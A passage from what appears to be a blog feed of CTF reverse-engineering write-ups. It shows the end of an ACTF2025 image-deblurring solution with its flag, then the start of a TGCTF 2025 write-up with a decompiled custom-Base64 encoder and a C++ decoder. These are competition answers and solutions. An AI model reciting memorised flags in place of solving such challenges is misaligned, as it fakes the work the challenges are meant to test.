class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0055596731</span>,</span><br><span class="line">            <span class="number">0.042622309</span>,</span><br><span class="line">            <span class="number">0.012483786</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0055596731</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>,</span><br><span class="line">            <span class="number">0.0</span>])</span><br><span class="line">    </span><br><span class="line">    image_path = <span class="string">r&quot;Layer2_Decrypted.bmp&quot;</span></span><br><span class="line">    </span><br><span class="line">    original_img = np.array(Image.<span class="built_in">open</span>(image_path).convert(<span class="string">&#x27;L&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    deblurred_img = load_and_process_image(image_path, motion_data)</span><br><span class="line">    </span><br><span class="line">    Image.fromarray(deblurred_img).save(<span class="string">&#x27;deblurred_image.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后得到一张可以看清flag的图片。</p><p><img src="/2025/04/27/ACTF-Deeptx/image-3.png" alt="alt text"></p><p>得到flag <code>ACTF&#123;DeEptCUdAR1VQVZ&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ACTF2025-Reverse-Deeptx-WP&quot;&gt;&lt;a href=&quot;#ACTF2025-Reverse-Deeptx-WP&quot; class=&quot;headerlink&quot; title=&quot;ACTF2025 Reverse Deeptx WP&quot;&gt;&lt;/a&gt;ACTF2025</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>TGCTF 2025 逆向WP</title>
    <link href="https://tkazer.github.io/2025/04/13/TGCTF2025/"/>
    <id>https://tkazer.github.io/2025/04/13/TGCTF2025/</id>
    <published>2025-04-13T11:12:25.000Z</published>
    <updated>2025-04-16T04:16:50.460Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TGCTF-2025-逆向WP"><a href="#TGCTF-2025-逆向WP" class="headerlink" title="TGCTF 2025 逆向WP"></a>TGCTF 2025 逆向WP</h1><p>战队名：不知道</p><p>排名：3</p><p>上次XYCTF是痛失Web手，这次又是痛失Pwn手，啥时候能全队一起打一次（）。这次Re难度还行，磨磨唧唧整了一会也是AK了。</p><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><p>Base64 变种加密</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__fastcall <span class="title">sub_7FF7DC6C10E0</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  __int64 v7; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">size_t</span> v8; <span class="comment">// rcx</span></span><br><span class="line">  _BYTE *v9; <span class="comment">// r8</span></span><br><span class="line">  __int64 v10; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// edi</span></span><br><span class="line">  __int64 v19; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v23; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v27; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v28; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v30[<span class="number">80</span>]; <span class="comment">// [rsp+20h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [rsp+90h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v30, <span class="string">&quot;GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI&quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v2;</span><br><span class="line">  <span class="keyword">while</span> ( *(_BYTE *)(a1 + v2) );</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = (<span class="type">int</span>)v2 / <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)v2 == <span class="number">3</span> * ((<span class="type">int</span>)v2 / <span class="number">3</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    v6 = <span class="number">4</span> * v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="type">int</span>)v2 % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">1</span>;</span><br><span class="line">    v6 = <span class="number">4</span> * v4 + <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="type">int</span>)v2 % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">2</span>;</span><br><span class="line">    v6 = <span class="number">4</span> * v4 + <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = v31;</span><br><span class="line">    v6 = v31;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = v6;</span><br><span class="line">  v8 = v6 + <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">    v8 = <span class="number">-1</span>;</span><br><span class="line">  v9 = <span class="built_in">malloc</span>(v8);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)v2 - v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = a1 + <span class="number">2</span>;</span><br><span class="line">    v11 = ((<span class="type">int</span>)v2 - v5 - <span class="number">1LL</span>) / <span class="number">3uLL</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 += <span class="number">4</span>;</span><br><span class="line">      v12 = *(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">2</span>) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      v10 += <span class="number">3</span>;</span><br><span class="line">      v13 = v12 + <span class="number">24</span>;</span><br><span class="line">      v14 = v13 - <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v13 &lt;= <span class="number">0x40</span> )</span><br><span class="line">        v14 = v13;</span><br><span class="line">      v9[v3 - <span class="number">4</span>] = v30[v14];</span><br><span class="line">      v15 = ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">4</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v10 - <span class="number">5</span>) &amp; <span class="number">3</span>))) - <span class="number">40</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">4</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v10 - <span class="number">5</span>) &amp; <span class="number">3u</span>))) + <span class="number">24</span> &lt;= <span class="number">0x40</span> )</span><br><span class="line">        v15 = ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">4</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v10 - <span class="number">5</span>) &amp; <span class="number">3</span>))) + <span class="number">24</span>;</span><br><span class="line">      v9[v3 - <span class="number">3</span>] = v30[v15];</span><br><span class="line">      v16 = ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">3</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (*(_BYTE *)(v10 - <span class="number">4</span>) &amp; <span class="number">0xF</span>))) - <span class="number">40</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">3</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (*(_BYTE *)(v10 - <span class="number">4</span>) &amp; <span class="number">0xFu</span>))) + <span class="number">24</span> &lt;= <span class="number">0x40</span> )</span><br><span class="line">        v16 = ((*(<span class="type">unsigned</span> __int8 *)(v10 - <span class="number">3</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (*(_BYTE *)(v10 - <span class="number">4</span>) &amp; <span class="number">0xF</span>))) + <span class="number">24</span>;</span><br><span class="line">      v9[v3 - <span class="number">2</span>] = v30[v16];</span><br><span class="line">      v17 = (*(_BYTE *)(v10 - <span class="number">3</span>) &amp; <span class="number">0x3F</span>) - <span class="number">40</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (*(_BYTE *)(v10 - <span class="number">3</span>) &amp; <span class="number">0x3Fu</span>) + <span class="number">24</span> &lt;= <span class="number">0x40</span> )</span><br><span class="line">        v17 = (*(_BYTE *)(v10 - <span class="number">3</span>) &amp; <span class="number">0x3F</span>) + <span class="number">24</span>;</span><br><span class="line">      v9[v3 - <span class="number">1</span>] = v30[v17];</span><br><span class="line">      --v11;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v11 );</span><br><span class="line">  &#125;</span><br><span class="line">  v18 = v5 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v18 )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = (*(<span class="type">unsigned</span> __int8 *)((<span class="type">int</span>)v2 + a1 - <span class="number">1</span>) &gt;&gt; <span class="number">2</span>) - <span class="number">40</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (*(<span class="type">unsigned</span> __int8 *)((<span class="type">int</span>)v2 + a1 - <span class="number">1</span>) &gt;&gt; <span class="number">2</span>) + <span class="number">24</span> &lt;= <span class="number">0x40u</span> )</span><br><span class="line">      v25 = (*(<span class="type">unsigned</span> __int8 *)((<span class="type">int</span>)v2 + a1 - <span class="number">1</span>) &gt;&gt; <span class="number">2</span>) + <span class="number">24</span>;</span><br><span class="line">    v9[v7 - <span class="number">4</span>] = v30[v25];</span><br><span class="line">    v26 = *(_BYTE *)((<span class="type">int</span>)v2 + a1 - <span class="number">1</span>) &amp; <span class="number">3</span>;</span><br><span class="line">    *(_WORD *)&amp;v9[v7 - <span class="number">2</span>] = <span class="number">15677</span>;</span><br><span class="line">    v27 = <span class="number">16</span> * v26 + <span class="number">24</span>;</span><br><span class="line">    v28 = v27 - <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v27 &lt;= <span class="number">0x40</span> )</span><br><span class="line">      v28 = v27;</span><br><span class="line">    v9[v7 - <span class="number">3</span>] = v30[v28];</span><br><span class="line">    <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v18 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_37:</span><br><span class="line">    v9[v7] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> v9;</span><br><span class="line">  &#125;</span><br><span class="line">  v19 = a1 + (<span class="type">int</span>)v2;</span><br><span class="line">  v20 = (*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">2</span>) &gt;&gt; <span class="number">2</span>) - <span class="number">40</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">2</span>) &gt;&gt; <span class="number">2</span>) + <span class="number">24</span> &lt;= <span class="number">0x40u</span> )</span><br><span class="line">    v20 = (*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">2</span>) &gt;&gt; <span class="number">2</span>) + <span class="number">24</span>;</span><br><span class="line">  v9[v7 - <span class="number">4</span>] = v30[v20];</span><br><span class="line">  v21 = ((*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v19 - <span class="number">2</span>) &amp; <span class="number">3</span>))) - <span class="number">40</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ((*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v19 - <span class="number">2</span>) &amp; <span class="number">3u</span>))) + <span class="number">24</span> &lt;= <span class="number">0x40</span> )</span><br><span class="line">    v21 = ((*(<span class="type">unsigned</span> __int8 *)(v19 - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (*(_BYTE *)(v19 - <span class="number">2</span>) &amp; <span class="number">3</span>))) + <span class="number">24</span>;</span><br><span class="line">  v9[v7 - <span class="number">3</span>] = v30[v21];</span><br><span class="line">  v22 = *(_BYTE *)(v19 - <span class="number">1</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  *(_WORD *)&amp;v9[v7 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  v23 = <span class="number">4</span> * v22 + <span class="number">24</span>;</span><br><span class="line">  v24 = <span class="number">4</span> * v22 - <span class="number">40</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v23 &lt;= <span class="number">0x40</span> )</span><br><span class="line">    v24 = v23;</span><br><span class="line">  v9[v7 - <span class="number">2</span>] = v30[v24];</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">base64_decode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_input_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *base64_table = <span class="string">&quot;GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> reverse_table[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        reverse_table[(<span class="type">unsigned</span> <span class="type">char</span>)base64_table[i]] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> input_len = <span class="built_in">strlen</span>(_input_);</span><br><span class="line">    <span class="type">size_t</span> padding = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input_len &gt; <span class="number">0</span> &amp;&amp; _input_[input_len - <span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        padding++;</span><br><span class="line">        <span class="keyword">if</span> (input_len &gt; <span class="number">1</span> &amp;&amp; _input_[input_len - <span class="number">2</span>] == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            padding++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> output_len = (input_len * <span class="number">3</span>) / <span class="number">4</span> - padding;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *output = (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(output_len + <span class="number">1</span>);</span><br><span class="line">    output[output_len] = <span class="number">0</span>;</span><br><span 